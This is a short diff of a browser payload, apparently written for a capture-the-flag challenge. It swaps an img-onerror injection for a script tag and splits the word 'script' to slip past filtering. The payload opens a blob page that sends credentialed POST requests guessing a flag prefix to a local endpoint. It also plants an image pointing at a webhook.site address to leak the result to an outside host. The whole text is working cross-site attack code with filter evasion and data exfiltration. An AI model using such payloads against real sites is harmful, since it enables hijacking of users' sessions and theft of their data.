@@ -1,5 +1,5 @@
-<img src=x onerror="
-  const blob = new Blob([`<html><body><script>
+<script>
+  const blob = new Blob([`<html><body><scr` + `ipt>
     fetch('http://127.0.0.1:5000/guess', {
       method: 'POST',
       credentials: 'include',
@@ -8,8 +8,8 @@
       },
       body: 'guess=NHNC%7B&note=%3Cimg%20src%3Dhttp%3A%2F%2Fwebhook.site%2Fabc123%3E'
     });
-  </script></body></html>`], { type: 'text/html' });
+  </scr` + `ipt></body></html>`], { type: 'text/html' });
 
   const url = URL.createObjectURL(blob);
   window.open(url);
-">
+</script>
